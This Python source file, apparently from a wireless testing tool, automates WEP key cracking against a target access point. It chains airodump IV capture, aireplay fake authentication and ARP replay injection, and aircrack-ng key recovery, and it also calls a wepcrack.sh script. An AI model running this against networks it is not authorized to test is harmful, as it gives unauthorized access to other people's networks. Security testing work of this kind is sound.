#!/usr/bin/env python3
import time
from subprocess import TimeoutExpired, run, PIPE

from tests import Test
from tools.util import remove_colon


class Aircrack:
    def aircrack(self, target):
        # Cracking
        crack = None
        try:
            crack = run(["aircrack-ng", "-q", "-b", target.bssid, target.target_ivs_file + "crackwep" + '-01.cap'],
                        stdout=PIPE, timeout=300)
        except TimeoutExpired:
            print("WEP crack timeout")
        return crack

    def crack_wep(self, target):
        crack = self.aircrack(target)
        code = 3
        if crack is not None:  # if not timeout
            code = crack.returncode
            results = crack.stdout.decode()
            for line in results.splitlines():
                print(line)  # debug
                if "KEY FOUND" in line:
                    target.key = remove_colon(line[13:-4])
                    code = 0
                elif "Got no data packets" in line:
                    code = 3
        self.capture.kill()
        self.auth.kill()
        self.arp.kill()
        return code

    def auto_crack_wep(self, target):
        self.capture = Test.airodump.capture_iv(target, "crackwep")
        time.sleep(5)
        self.auth = Test.aireplay.fake_auth(target)
        time.sleep(5)
        self.arp = Test.aireplay.arp_requesting(target)
        time.sleep(15)
        code = self.crack_wep(target)
        return code

    def auto_crack_wep2(self, target):
        crack = run(
            ["./wepcrack.sh", Test.interface.name, target.bssid, target.channel, target.target_ivs_file + "crackwep"],
            stdout=PIPE, timeout=300)
        code = crack.returncode
        results = crack.stdout.decode()
        for line in results.splitlines():
            print(line)  # debug
            if "KEY FOUND" in line:
                target.key = remove_colon(line[13:-4])
                code = 0
            elif "Got no data packets" in line:
                code = 3
        return code
